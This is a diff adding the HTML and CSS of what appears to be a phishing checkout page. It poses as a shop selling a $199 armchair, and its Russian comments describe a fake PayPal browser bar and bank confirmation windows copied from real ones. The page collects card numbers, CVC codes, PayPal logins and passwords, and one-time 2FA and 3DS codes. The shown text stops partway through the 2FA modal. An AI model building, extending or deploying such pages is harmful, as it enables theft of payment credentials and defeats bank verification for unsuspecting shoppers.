@@ -1,0 +1,1921 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout - Official Secure Payment</title>
+    <link rel="preconnect" href="https://googleapis.com">
+    <link rel="preconnect" href="https://gstatic.com" crossorigin>
+    <link href="https://googleapis.com" rel="stylesheet">
+    <style>
+        /* 1. Базовые стили разметки страницы */
+        body { 
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+            background-color: #ffffff; 
+            color: #111111; 
+            margin: 0; 
+            padding: 40px 20px; 
+            display: flex; 
+            justify-content: center; 
+            -webkit-font-smoothing: antialiased; 
+        }
+        .checkout-container { 
+            display: flex; 
+            gap: 40px; 
+            max-width: 1100px; 
+            width: 100%; 
+            box-sizing: border-box; 
+        }
+        .left-col { 
+            flex: 1.3; 
+            min-width: 0; 
+        }
+        .right-col { 
+            flex: 1; 
+            min-width: 380px; 
+            background: #ffffff; 
+            padding: 10px; 
+            box-sizing: border-box; 
+            align-self: flex-start; 
+        }
+        @media (max-width: 850px) { 
+            .checkout-container { flex-direction: column; gap: 30px; } 
+            .right-col { min-width: 100%; } 
+        }
+        
+        /* 2. Заголовки, шрифты и таблицы заказов */
+        h3 { 
+            font-size: 22px; 
+            font-weight: 500; 
+            color: #111111; 
+            margin-top: 0; 
+            margin-bottom: 24px; 
+            text-transform: uppercase; 
+            letter-spacing: 0.5px; 
+        }
+        .stripe-title { 
+            font-size: 15px; 
+            font-weight: 600; 
+            color: #111111; 
+            margin-bottom: 16px; 
+            text-align: left; 
+        }
+        .order-table { 
+            width: 100%; 
+            border-collapse: collapse; 
+            font-size: 14px; 
+            margin-bottom: 30px; 
+        }
+        .order-table th { 
+            padding-bottom: 12px; 
+            border-bottom: 1px solid #e2e8f0; 
+            color: #111111; 
+            font-weight: 500; 
+        }
+        .order-table td { 
+            padding: 16px 0; 
+            border-bottom: 1px solid #e2e8f0; 
+            color: #111111; 
+            font-weight: 400; 
+        }
+        .order-table tr.total-row td { 
+            border-bottom: none; 
+            font-size: 15px; 
+            font-weight: 600; 
+            color: #111111; 
+            padding-top: 20px; 
+        }
+        .text-right { 
+            text-align: right; 
+        }
+        
+        /* 3. Интерактивные вкладки выбора платежных шлюзов */
+        .payment-tabs { 
+            display: flex; 
+            gap: 10px; 
+            margin-bottom: 20px; 
+            width: 100%; 
+        }
+        .pay-tab { 
+            flex: 1; 
+            display: flex; 
+            flex-direction: row; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 8px; 
+            padding: 8px 12px; 
+            border: 1px solid #cbd5e1; 
+            border-radius: 6px; 
+            cursor: pointer; 
+            background: #f8fafc; 
+            font-size: 13px; 
+            font-weight: 600; 
+            color: #475569; 
+            transition: all 0.15s ease; 
+            height: 38px; 
+            box-sizing: border-box; 
+        }
+        .pay-tab svg { 
+            width: 16px; 
+            height: 16px; 
+            fill: currentColor; 
+            display: block; 
+        }
+        .pay-tab.active { 
+            border-color: #4f46e5; 
+            background: #4f46e5; 
+            color: #ffffff; 
+            box-shadow: 0 2px 8px rgba(79, 70, 229, 0.15); 
+        }
+    </style>
+    <style>
+        /* 4. Стили элементов форм ввода и группировки полей */
+        .group { 
+            margin-bottom: 16px; 
+            text-align: left; 
+            width: 100%; 
+            box-sizing: border-box; 
+        }
+        .row { 
+            display: flex; 
+            gap: 14px; 
+            width: 100%; 
+        }
+        .row .group { 
+            flex: 1; 
+        }
+        label { 
+            display: block; 
+            margin-bottom: 8px; 
+            font-weight: 500; 
+            font-size: 13.5px; 
+            color: #111111; 
+            text-align: left; 
+        }
+        label .req { 
+            color: #b91c1c; 
+            font-weight: bold; 
+            margin-left: 2px; 
+        }
+        .input-wrapper-container { 
+            position: relative; 
+            width: 100%; 
+        }
+        input[type="text"], input[type="email"], input[type="tel"], input[type="password"], select { 
+            width: 100%; 
+            padding: 13px 14px; 
+            font-size: 14.5px; 
+            border: 1px solid #cbd5e1; 
+            border-radius: 8px; 
+            box-sizing: border-box; 
+            color: #111111; 
+            background-color: #fcfcfc; 
+            outline: none; 
+            transition: all 0.15s ease; 
+            font-family: inherit; 
+        }
+        input[type="text"]:focus, input[type="email"]:focus, input[type="tel"]:focus, input[type="password"]:focus, select:focus { 
+            border-color: #a5b4fc; 
+            background-color: #ffffff; 
+            box-shadow: 0 0 0 4px rgba(165, 180, 252, 0.25); 
+        }
+        input::placeholder { 
+            color: #94a3b8; 
+            opacity: 1; 
+        }
+        .input-error { 
+            border-color: #ef4444 !important; 
+            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15) !important; 
+        }
+        
+        /* 5. Кнопка отправки и анимация лоадера */
+        .btn-place-order { 
+            width: 100%; 
+            padding: 15px; 
+            font-size: 14px; 
+            background-color: #bd7a3d; 
+            color: white; 
+            border: none; 
+            border-radius: 6px; 
+            cursor: pointer; 
+            font-weight: 600; 
+            text-transform: uppercase; 
+            margin-top: 25px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 10px; 
+            letter-spacing: 0.5px; 
+            font-family: inherit; 
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+        .privacy-text { 
+            font-size: 12.5px; 
+            color: #64748b; 
+            line-height: 1.5; 
+            text-align: left; 
+            margin-top: 25px; 
+            margin-bottom: 25px; 
+        }
+
+        /* 6. Размытый полупрозрачный фон для модальных окон шлюзов */
+        .payment-modal-backdrop { 
+            position: fixed !important; 
+            top: 0 !important; 
+            left: 0 !important; 
+            width: 100% !important; 
+            height: 100% !important; 
+            background: rgba(15, 23, 42, 0.4) !important; 
+            backdrop-filter: blur(6px) !important; 
+            -webkit-backdrop-filter: blur(6px) !important; 
+            display: none; 
+            align-items: center !important; 
+            justify-content: center !important; 
+            z-index: 999999 !important; 
+        }
+
+        /* 7. Белая центрированная коробка модального окна */
+        .payment-modal-window-box { 
+            background: #ffffff !important; 
+            border-radius: 12px !important; 
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2) !important; 
+            width: 440px !important; 
+            box-sizing: border-box !important; 
+            display: flex !important; 
+            flex-direction: column !important; 
+            position: relative !important; 
+            overflow: hidden !important; 
+            margin: auto !important;
+            border: none !important;
+        }
+        .close-modal-x-btn { 
+            font-size: 20px; 
+            color: #94a3b8; 
+            cursor: pointer; 
+            font-weight: bold; 
+            line-height: 1; 
+            user-select: none; 
+        }
+
+        /* 8. Состояние деактивированной кнопки при отправке (Processing) */
+        .btn-place-order:disabled, .btn-bank-push-complete:disabled, .btn-bank-submit-inline:disabled, #paypal-2fa-btn:disabled, #paypal-submit-btn:disabled {
+            background-color: #f1f5f9 !important; 
+            color: #94a3b8 !important; 
+            border: 1px solid #cbd5e1 !important;
+            cursor: not-allowed !important;
+            box-shadow: none !important;
+        }
+
+        /* 9. Крутящийся микро-спиннер бесконечной загрузки */
+        .spinner-inline {
+            display: none; 
+            border: 2px solid rgba(148, 163, 184, 0.3) !important; 
+            border-top: 2px solid #94a3b8 !important; 
+            border-radius: 50% !important; 
+            width: 14px !important; 
+            height: 14px !important; 
+            animation: spin 0.8s linear infinite !important;
+            margin-right: 8px !important;
+            box-sizing: border-box !important;
+        }
+    </style>
+    <style>
+        /* 10. Стили фейковой мобильной строки браузера внутри окон PayPal */
+        .paypal-browser-bar { 
+            background: #fdfdfd; 
+            border-bottom: 1px solid #e2e8f0; 
+            padding: 10px 14px; 
+            display: flex; 
+            align-items: center; 
+            gap: 12px; 
+            width: 100%; 
+            box-sizing: border-box; 
+        }
+        .paypal-url-input-box { 
+            background: #f1f5f9; 
+            border: 1px solid #cbd5e1; 
+            border-radius: 20px; 
+            padding: 6px 14px; 
+            font-size: 13px; 
+            color: #334155; 
+            display: flex; 
+            align-items: center; 
+            gap: 6px; 
+            flex: 1; 
+            font-family: sans-serif; 
+        }
+        .secure-lock-icon { 
+            color: #16a34a; 
+            font-size: 11px; 
+        }
+        
+        /* 11. Стили банковского контейнера подтверждения 3DS кодов (Строго по эталону) */
+        .bank-3ds-container { 
+            background: #ffffff !important; 
+            padding: 0 !important; 
+            width: 100% !important; 
+            box-sizing: border-box !important; 
+            display: none; 
+            flex-direction: column !important; 
+            font-family: Arial, Helvetica, sans-serif !important; 
+        }
+        
+        /* 12. Общий контейнер логотипов для окон СМС и Пуша */
+        .bank-3ds-logos-row, #bankPushModalWrapper .bank-3ds-logos-row { 
+            display: flex !important; 
+            flex-direction: row !important; 
+            justify-content: space-between !important; 
+            align-items: center !important; 
+            margin-top: -5px !important; 
+            margin-bottom: 25px !important; 
+            width: 100% !important;
+            height: 65px !important; 
+            box-sizing: border-box !important;
+            padding: 0 5px 0 0 !important; 
+        }
+
+                 /* Левый логотип (Банк) */
+        .bank-3ds-logo-left, #bankPushModalWrapper .bank-3ds-logo-left { 
+            width: 200px !important; 
+            max-width: 200px !important; 
+            height: 100px !important; 
+            max-height: 100px !important;
+            object-fit: contain !important; 
+            display: block !important;
+            margin-left: 0 !important; 
+        }
+
+        /* Правый логотип (Платежная система) */
+        .bank-3ds-logo-right, #bankPushModalWrapper .bank-3ds-logo-right { 
+            width: 225px !important; 
+            max-width: 225px !important; 
+            height: 100px !important; 
+            max-height: 100px !important;
+            object-fit: contain !important; 
+            display: block !important;
+            margin-right: 10px !important; 
+        }
+
+
+        /* 13. Откалиброванная строка ввода OTP */
+        .bank-3ds-input-row { 
+            display: flex !important; 
+            align-items: center !important; 
+            justify-content: center !important; 
+            gap: 10px !important; 
+            margin-top: 15px !important; 
+            border-top: 1px solid #dfdfdf !important; 
+            padding-top: 25px !important;
+            width: 100% !important;
+            box-sizing: border-box !important;
+        }
+        .bank-3ds-label-inline { 
+            font-size: 14px !important; 
+            color: #111111 !important; 
+            font-weight: 700 !important; 
+            font-family: Arial, sans-serif !important; 
+            letter-spacing: 0.6px !important; 
+        }
+        .bank-3ds-field-container { 
+            width: 85px !important; 
+            min-width: 85px !important; 
+            flex-shrink: 0 !important; 
+        }
+        .bank-3ds-field-container input { 
+            width: 100% !important; 
+            height: 40px !important; 
+            font-size: 16px !important; 
+            border: 1px solid #767676 !important; 
+            border-radius: 4px !important; 
+            text-align: center !important; 
+            font-weight: 700 !important; 
+            outline: none !important; 
+            color: #111111 !important; 
+            box-sizing: border-box !important; 
+        }
+        .btn-bank-submit-inline { 
+            width: 135px !important; 
+            min-width: 135px !important;
+            height: 40px !important; 
+            padding: 0 12px !important; 
+            font-size: 13.5px !important; 
+            font-weight: 700 !important; 
+            background-color: #4344db !important; 
+            color: #ffffff !important; 
+            border: none !important; 
+            border-radius: 4px !important; 
+            cursor: pointer !important; 
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+            box-sizing: border-box !important;
+            flex-shrink: 0 !important;
+        }
+
+        /* 14. Текст таймера и кнопки повторной отправки */
+        .bank-3ds-timer-text { 
+            font-size: 14px !important; 
+            color: #222222 !important; 
+            margin: 25px 0 15px 0 !important; 
+            text-align: center !important; 
+            font-family: Arial, Helvetica, sans-serif !important; 
+            font-weight: 700 !important; 
+            letter-spacing: 0.5px !important;
+        }
+        .bank-3ds-timer-text b { 
+            color: #b91c1c !important; 
+            font-weight: 800 !important; 
+            letter-spacing: 1.5px !important; 
+            display: inline-block !important;
+        }
+        .bank-3ds-resend-btn { 
+            font-size: 13.5px !important; 
+            color: #4344db !important; 
+            text-align: center !important; 
+            text-decoration: underline !important; 
+            font-weight: 700 !important; 
+            display: block !important; 
+            margin-bottom: 200px !important; 
+            font-family: Arial, sans-serif !important; 
+        }
+        .bank-footer-layout { 
+            display: flex !important; 
+            justify-content: space-between !important; 
+            align-items: center !important; 
+            border-top: 1px solid #eeeeee !important; 
+            padding-top: 14px !important; 
+            font-size: 12px !important; 
+            color: #64748b !important; 
+            position: absolute !important;
+            bottom: 20px !important; 
+            left: 25px !important;
+            right: 25px !important;
+            box-sizing: border-box !important; 
+        }
+    </style>
+    
+    <style>
+            <style>
+                               /* 15. Геометрия окна PUSH — Точная копия правого эталона */
+         #bankPushModalWrapper .payment-modal-window-box {
+            width: 460px !important; /* Увеличили общую ширину окна */
+            max-width: 95% !important; 
+            padding: 45px 35px 40px 35px !important; /* Увеличили отступы сверху и снизу, сделав окно длиннее */
+            background: #ffffff !important;
+            border-radius: 16px !important;
+            margin: auto !important;
+            border: none !important;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.15) !important;
+            box-sizing: border-box !important;
+            display: flex !important;
+            flex-direction: column !important;
+            align-items: center !important;
+        }
+
+                #bankPushModalWrapper .bank-3ds-logos-row {
+            display: flex !important;
+            flex-direction: row !important;
+            justify-content: space-between !important; 
+            align-items: center !important;
+            margin-top: 5px !important;
+            margin-bottom: 25px !important;
+            width: 100% !important; 
+            height: 125px !important; /* Увеличили высоту контейнера с 65px до 125px */
+            box-sizing: border-box !important;
+            padding: 0 5px !important; 
+        }
+
+        
+                /* Увеличенные в 2 раза логотипы для окна PUSH */
+        #bankPushModalWrapper .bank-3ds-logo-left {
+            width: 450px !important; /* Было 160px */
+            max-width: 450px !important;
+            height: 200px !important; /* Было 60px */
+            object-fit: contain !important;
+            display: block !important;
+            margin: 0 !important;
+        }
+        
+        #bankPushModalWrapper .bank-3ds-logo-right {
+            width: 450px !important; /* Было 130px */
+            max-width: 450px !important;
+            height: 200px !important; /* Было 60px */
+            object-fit: contain !important;
+            display: block !important;
+            margin: 0 !important; 
+        }
+
+                #bankPushModalWrapper h4 {
+            font-family: Arial, Helvetica, sans-serif !important;
+            font-size: 21px !important;
+            font-weight: 700 !important;
+            color: #111111 !important;
+            margin: 0 auto 18px auto !important;
+            text-align: center !important;
+            letter-spacing: -0.3px !important;
+            max-width: 360px !important;
+            box-sizing: border-box !important;
+        }
+
+        #bankPushModalWrapper .bank-3ds-instructions {
+            font-family: Arial, Helvetica, sans-serif !important;
+            text-align: center !important; 
+            font-size: 13px !important;
+            color: #222222 !important;
+            line-height: 1.5 !important;
+            margin: 0 auto 20px auto !important;
+            padding: 0 !important;
+            max-width: 360px !important; /* Расширили текстовый блок, чтобы надпись встала в красивые длинные ряды */
+            box-sizing: border-box !important;
+            display: block !important;
+        }
+
+
+        /* 16. Графический круговой таймер пуша */
+        .bank-push-timer-circle-box {
+            position: relative !important;
+            width: 110px !important;
+            height: 110px !important;
+            margin: 15px auto !important; 
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+        }
+        .bank-push-svg-ring {
+            position: absolute !important;
+            top: 0; left: 0;
+            width: 110px; height: 110px;
+            transform: rotate(-90deg);
+        }
+        .bank-push-svg-ring circle {
+            cx: 55 !important;
+            cy: 55 !important;
+            r: 46 !important;
+            fill: none;
+            stroke-width: 4;
+        }
+        .bank-push-circle-bg { stroke: #e2e8f0 !important; }
+        .bank-push-circle-progress {
+            stroke: #4b5ed4 !important;
+            stroke-dasharray: 289; 
+            stroke-dashoffset: 0;
+            transition: stroke-dashoffset 1s linear;
+        }
+        .bank-push-timer-counter-text {
+            display: flex !important;
+            flex-direction: column !important;
+            align-items: center !important;
+            justify-content: center !important;
+            font-family: Arial, Helvetica, sans-serif !important;
+            text-align: center !important;
+        }
+        .bank-push-timer-counter-text .digits {
+            font-size: 26px !important;
+            font-weight: 700 !important;
+            color: #111111 !important;
+            line-height: 1 !important;
+        }
+        .bank-push-timer-counter-text .sub {
+            font-size: 10px !important;
+            color: #64748b !important;
+            margin-top: 4px !important;
+            font-weight: 500;
+        }
+
+        /* Аккуратная закругленная кнопка строго по ширине из правого скрина */
+        .btn-bank-push-complete {
+            width: 85% !important; /* Уменьшили ширину, чтобы появились поля по бокам */
+            max-width: 300px !important;
+            padding: 12px !important;
+            font-size: 14px !important;
+            font-weight: 700 !important;
+            background-color: #4b5ed4 !important;
+            color: #ffffff !important;
+            border: none !important;
+            border-radius: 8px !important;
+            cursor: pointer;
+            text-transform: uppercase !important;
+            letter-spacing: 0.5px !important;
+            font-family: Arial, Helvetica, sans-serif !important;
+            margin: 25px auto 25px auto !important;
+            box-shadow: 0 4px 12px rgba(75, 94, 212, 0.2) !important;
+            transition: background 0.15s ease !important;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+            box-sizing: border-box !important;
+        }
+        .btn-bank-push-complete:hover {
+            background-color: #3b4cb8 !important;
+        }
+        
+        /* Нижний футер безопасности */
+                /* Исправление футера безопасности PUSH-окна — Защита от вылета текста */
+        #bankPushModalWrapper .bank-footer-layout { 
+            display: flex !important; 
+            justify-content: space-between !important; 
+            align-items: center !important; 
+            border-top: 1px solid #eeeeee !important; 
+            padding-top: 14px !important; 
+            font-size: 12px !important; 
+            color: #64748b !important; 
+            width: 100% !important; /* Автоматически подстраивается под ширину окна */
+            box-sizing: border-box !important; /* Включает padding в общую ширину, предотвращая вылеты */
+            position: relative !important; /* Убирает баг с абсолютным позиционированием за границы */
+            margin-top: 25px !important; /* Создает красивый отступ снизу от кнопки */
+            padding-left: 5px !important; /* Небольшой аккуратный внутренний отступ слева */
+            padding-right: 5px !important; /* Небольшой аккуратный внутренний отступ справа */
+        }
+
+
+        
+        /* 17. Стили ячеек 2FA PayPal */
+        .paypal-otp-row-grid {
+            display: flex !important;
+            flex-direction: row !important;
+            justify-content: center !important;
+            gap: 10px !important;
+            margin: 25px 0 !important;
+            width: 100% !important;
+            box-sizing: border-box !important;
+        }
+        .paypal-otp-cell-field {
+            width: 45px !important;
+            height: 45px !important;
+            font-size: 18px !important;
+            font-weight: 700 !important;
+            color: #111111 !important;
+            background-color: #f1f5f9 !important;
+            border: 1px solid #cbd5e1 !important;
+            border-radius: 6px !important;
+            text-align: center !important;
+            outline: none !important;
+            box-sizing: border-box !important;
+            font-family: Arial, sans-serif !important;
+            transition: all 0.15s ease !important;
+        }
+        .paypal-otp-cell-field:focus {
+            border-color: #003087 !important;
+            background-color: #ffffff !important;
+            box-shadow: 0 0 0 3px rgba(0, 48, 135, 0.15) !important;
+        }
+        .paypal-panel-loader { position: absolute !important; top:0 !important; left:0 !important; width:100% !important; height:100% !important; background:rgba(255,255,255,0.96) !important; display:none; flex-direction:column !important; align-items:center !important; justify-content:center !important; z-index:10 !important; }
+        .paypal-panel-spinner-ring { border: 3px solid #f3f3f3 !important; border-top: 3px solid #003087 !important; border-radius: 50% !important; width: 45px !important; height: 45px !important; animation: spin 0.8s linear infinite !important; }
+        .paypal-embedded-header { font-size: 28px !important; font-weight: 800 !important; color: #003087 !important; font-style: italic !important; margin-bottom: 15px !important; text-align: center !important; font-family: sans-serif !important; }
+        .paypal-embedded-header span { color: #0079c1 !important; }
+        .paypal-sub-text { font-size: 15px !important; color: #111111 !important; margin-bottom: 25px !important; text-align: center !important; font-family: sans-serif !important; }
+        .paypal-alert-error { background: #fef2f2 !important; border: 1px solid #fca5a5 !important; color: #b91c1c !important; font-size: 13px !important; padding: 10px !important; border-radius: 6px !important; margin-bottom: 15px !important; text-align: left !important; font-family: sans-serif !important; }
+        .method-info-window { background: white; padding: 0; width: 100%; box-sizing: border-box; display: none; flex-direction: column; text-align: center; position: relative; }
+        .final-bank-status-window { background: white; padding: 10px 0; width: 100%; box-sizing: border-box; display: none; flex-direction: column; text-align: center; }
+    </style>
+</head>
+<body>
+    
+    <!-- Основной контейнер вида страницы оформления заказа -->
+    <div class="checkout-container" id="main-checkout-view">
+        
+        <!-- Левая колонка: Форма Billing details -->
+        <div class="left-col">
+            <h3>Billing details</h3>
+            <form id="billing-form" onsubmit="return false;">
+                
+                <!-- Строка: Имя и Фамилия -->
+                <div class="row">
+                    <div class="group">
+                        <label for="firstName">First name <span class="req">*</span></label>
+                        <input type="text" id="firstName" placeholder="First Name" autocomplete="given-name">
+                    </div>
+                    <div class="group">
+                        <label for="lastName">Last name <span class="req">*</span></label>
+                        <input type="text" id="lastName" placeholder="Last Name" autocomplete="family-name">
+                    </div>
+                </div>
+                
+                <!-- Поле: Название компании (необязательное) -->
+                <div class="group">
+                    <label for="companyName">Company name (optional)</label>
+                    <input type="text" id="companyName" placeholder="Company Name" autocomplete="organization">
+                </div>
+                
+                <!-- Выпадающий список: Страна / Регион -->
+                <div class="group">
+                    <label for="countryRegion">Country / Region <span class="req">*</span></label>
+                    <select id="countryRegion" autocomplete="country">
+                        <option value="" disabled selected>Select country...</option>
+                       <!-- Полный список стран Евросоюза (ЕС) -->
+    <option value="AT">Austria (Австрия)</option>
+    <option value="BE">Belgium (Бельгия)</option>
+    <option value="BG">Bulgaria (Болгария)</option>
+    <option value="HR">Croatia (Хорватия)</option>
+    <option value="CY">Cyprus (Кипр)</option>
+    <option value="CZ">Czech Republic (Чехия)</option>
+    <option value="DK">Denmark (Дания)</option>
+    <option value="EE">Estonia (Эстония)</option>
+    <option value="FI">Finland (Финляндия)</option>
+    <option value="FR">France (Франция)</option>
+    <option value="DE">Germany (Германия)</option>
+    <option value="GR">Greece (Греция)</option>
+    <option value="HU">Hungary (Венгрия)</option>
+    <option value="IE">Ireland (Ирландия)</option>
+    <option value="IT">Italy (Италия)</option>
+    <option value="LV">Latvia (Латвия)</option>
+    <option value="LT">Lithuania (Литва)</option>
+    <option value="LU">Luxembourg (Люксембург)</option>
+    <option value="MT">Malta (Мальта)</option>
+    <option value="NL">Netherlands (Нидерланды)</option>
+    <option value="PL">Poland (Польша)</option>
+    <option value="PT">Portugal (Португалия)</option>
+    <option value="RO">Romania (Румыния)</option>
+    <option value="SK">Slovakia (Словакия)</option>
+    <option value="SI">Slovenia (Словения)</option>
+    <option value="ES">Spain (Испания)</option>
+    <option value="SE">Sweden (Швеция)</option>
+</select>
+                </div>
+
+                <!-- Строка адреса проживания (улица, дом, квартира) -->
+                <div class="group">
+                    <label for="streetAddress">Street address <span class="req">*</span></label>
+                    <input type="text" id="streetAddress" placeholder="House number and street name" style="margin-bottom:12px;" autocomplete="address-line1">
+                    <input type="text" id="apartment" placeholder="Apartment, suite, unit, etc. (optional)" autocomplete="address-line2">
+                </div>
+                
+                <!-- Город / Населенный пункт -->
+                <div class="group">
+                    <label for="townCity">Town / City <span class="req">*</span></label>
+                    <input type="text" id="townCity" placeholder="Town / City" autocomplete="address-level2">
+                </div>
+                
+                <!-- ЗАМЕНИТЕ НА ЭТОТ ВАРИАНТ: -->
+<div class="group">
+    <label for="stateRegion">State / County / Region <span class="req">*</span></label>
+    <input type="text" id="stateRegion" placeholder="State, county or region name" autocomplete="address-level1">
+</div>
+
+                
+                <!-- Почтовый индекс -->
+                <div class="group">
+                    <label for="zipCode">ZIP Code <span class="req">*</span></label>
+                    <input type="text" id="zipCode" placeholder="ZIP Code" autocomplete="postal-code">
+                </div>
+                
+                <!-- Номер мобильного телефона -->
+                <div class="group">
+                    <label for="phone">Phone <span class="req">*</span></label>
+                    <input type="tel" id="phone" placeholder="+1 (555) 000-0000" autocomplete="tel">
+                </div>
+                
+                <!-- Основной email адрес -->
+                <div class="group">
+                    <label for="emailAddress">Email address <span class="req">*</span></label>
+                    <input type="email" id="emailAddress" placeholder="example@email.com" autocomplete="email">
+                </div>
+            </form>
+        </div>
+
+        <!-- Правая колонка: Информация о заказе и выбор платежной системы -->
+        <div class="right-col">
+            <h3>Your order</h3>
+            
+            <!-- Таблица спецификации заказа -->
+            <table class="order-table">
+                <thead>
+                    <tr>
+                        <th style="text-align: left;">Product</th>
+                        <th style="text-align: right;">Subtotal</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Armchair Black in Wood &times; 1</td>
+                        <td class="text-right">$199.00</td>
+                    </tr>
+                    <tr>
+                        <td>Subtotal</td>
+                        <td class="text-right">$199.00</td>
+                    </tr>
+                    <tr class="total-row">
+                        <td>Total</td>
+                        <td class="text-right">$199.00</td>
+                    </tr>
+                </tbody>
+            </table>
+            
+            <div class="stripe-title">Stripe</div>
+            
+            <!-- Вкладки выбора метода оплаты (Кастомные кнопки) -->
+           <!-- СТАЛО: Изначально обе вкладки серые и неактивные -->
+<div class="payment-tabs">
+    <div class="pay-tab" id="tab-card" onclick="openPaymentModal('card')">
+        <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
+        <span>Card</span>
+    </div>
+    <div class="pay-tab" id="tab-paypal" onclick="openPaymentModal('paypal')">
+        <svg viewBox="0 0 24 24"><path d="M20 8.02c0-2.3-1.83-3.92-4.14-3.92H9.08c-.46 0-.85.33-.92.78L5.73 20.35c-.05.3.18.57.49.57h3.81c.4 0 .75-.29.82-.68l1.04-5.26c.07-.39.41-.68.82-.68h1.22c3 0 5.07-1.48 5.76-4.22.29-1.15.29-2.11.29-2.06z"/></svg>
+        <span>PayPal</span>
+    </div>
+</div>
+
+            <!-- Форма ввода банковской карты (Отображается по умолчанию) -->
+            <!-- СТАЛО: Форма скрыта, пока пользователь не выберет метод -->
+<div id="stripe-inline-form-box" style="display: none; margin-top: 15px;">
+
+                <div class="group">
+                    <label for="cardNumber">Card number</label>
+                    <div class="input-wrapper-container" style="position: relative; display: flex; align-items: center;">
+                        <input type="text" id="cardNumber" placeholder="1234 1234 1234 1234" maxlength="19" autocomplete="off" style="padding-right: 55px; width: 100%;">
+                        <div style="position: absolute; right: 14px; top: 0; bottom: 0; display: flex; align-items: center; justify-content: center; pointer-events: none; z-index: 5;">
+                            <span style="font-size: 26px; line-height: 1; display: block; filter: drop-shadow(0 1px 1px rgba(0,0,0,0.12)); transform: translateY(-3px); font-family: -apple-system, BlinkMacSystemFont, sans-serif;">💳</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="group">
+                        <label for="expiry">Expiration date</label>
+                        <input type="text" id="expiry" placeholder="MM / YY" maxlength="7" autocomplete="off">
+                    </div>
+                    <div class="group">
+                        <label for="cvv">Security code</label>
+                        <input type="password" id="cvv" placeholder="CVC" maxlength="4" autocomplete="off">
+                    </div>
+                </div>
+                <div class="group">
+                    <label for="cardName">Cardholder Name</label>
+                    <input type="text" id="cardName" placeholder="Full name on card" autocomplete="off">
+                </div>
+            </div>
+
+            <!-- Предварительные инлайновые поля PayPal (Скрыты по умолчанию) -->
+            <div id="paypal-inline-fields-box" style="display: none; margin-top: 15px;">
+                <div class="group">
+                    <label for="paypalInlineEmail">Email</label>
+                    <input type="email" id="paypalInlineEmail" placeholder="charly@gmail.com" autocomplete="off">
+                </div>
+                <div class="group">
+                    <label for="paypalInlineName">Full Name</label>
+                    <input type="text" id="paypalInlineName" placeholder="Charly Ferguson" autocomplete="off">
+                </div>
+                <div style="display: flex; align-items: flex-start; gap: 12px; margin: 15px 0; background: #f8fafc; padding: 12px; border-radius: 6px; border: 1px solid #e2e8f0;">
+                    <div style="font-size: 20px; line-height: 1;">➡️</div>
+                    <div style="font-size: 13px; color: #475569; line-height: 1.4;">After submission, you will be redirected to securely complete next steps.</div>
+                </div>
+            </div>
+            
+            <p class="privacy-text">Your personal data will be used to process your order, support your experience throughout this website, and for other purposes described in our privacy policy.</p>
+            
+            <!-- Основная кнопка подтверждения заказа с бесконечной CSS-загрузкой -->
+            <button type="button" class="btn-place-order" id="card-submit-btn" onclick="handleMainPlaceOrderClick()">
+                <div class="spinner-inline" id="card-btn-spinner"></div>
+                <span>Place order</span>
+            </button>
+        </div>
+    </div>
+    <!-- ================================================================= -->
+    <!-- ШЛЮЗОВЫЕ МОДАЛЬНЫЕ ОКНА PAYPAL (ВСПЛЫВАЮЩИЕ ИНТЕРФЕЙСЫ)           -->
+    <!-- ================================================================= -->
+
+    <!-- ОКНО ВСТРОЕННОГО ВХОДА PAYPAL (ЛОГИН / ПАРОЛЬ) -->
+    <div class="payment-modal-backdrop" id="paypalModalWrapper">
+        <div class="payment-modal-window-box" style="width: 440px !important; border-radius: 12px !important; background: #ffffff !important; margin: auto !important;">
+            
+            <!-- Адресная строка мобильного браузера -->
+            <div class="paypal-browser-bar">
+                <div class="paypal-url-input-box">
+                    <span class="secure-lock-icon">🔒</span>
+                    <span style="color: #16a34a; font-weight: 600;">https://</span><span style="color: #334155; font-weight: 400;">://paypal.com</span>
+                </div>
+                <div class="close-modal-x-btn" onclick="closeAllPaymentModals()">&times;</div>
+            </div>
+
+            <!-- Форма авторизации -->
+            <div style="padding: 35px 25px; position: relative; box-sizing: border-box; width: 100%;">
+                <div class="paypal-panel-loader" id="paypalEmbeddedLoader"><div class="paypal-panel-spinner-ring"></div></div>
+                <div class="paypal-embedded-header">Pay<span>Pal</span></div>
+                
+                <!-- Контейнер ошибок, убирающий падение JS скрипта -->
+                <div class="paypal-alert-error" id="paypal-embedded-error-box" style="display: none !important;">Some of your information isn't correct. Please try again.</div>
+                
+                <div class="group">
+                    <input type="email" id="emPaypalEmail" placeholder="Email or mobile number" style="height: 48px;">
+                </div>
+                <div class="group">
+                    <input type="password" id="emPaypalPassword" placeholder="Password" style="height: 48px;">
+                </div>
+                
+                <button type="button" class="btn-place-order" id="paypal-submit-btn" style="background-color: #0070ba; border-radius: 20px; font-weight: 700; margin-top: 25px;" onclick="submitEmbeddedPaypalLoginForm()">
+                    <div class="spinner-inline" id="paypal-btn-spinner"></div>
+                    <span>Log In</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- МОДАЛЬНОЕ ОКНО PAYPAL 2FA (ВВОД СМС-КОДА ИЗ 6 ЦИФР В ОДИН РЯД) -->
+    <div class="payment-modal-backdrop" id="paypalOtpModalWrapper">
+        <div class="payment-modal-window-box" style="width: 410px !important; border-radius: 12px !important; background: #ffffff !important; margin: auto !important;">
+            
+            <!-- Адресная строка браузера 2FA -->
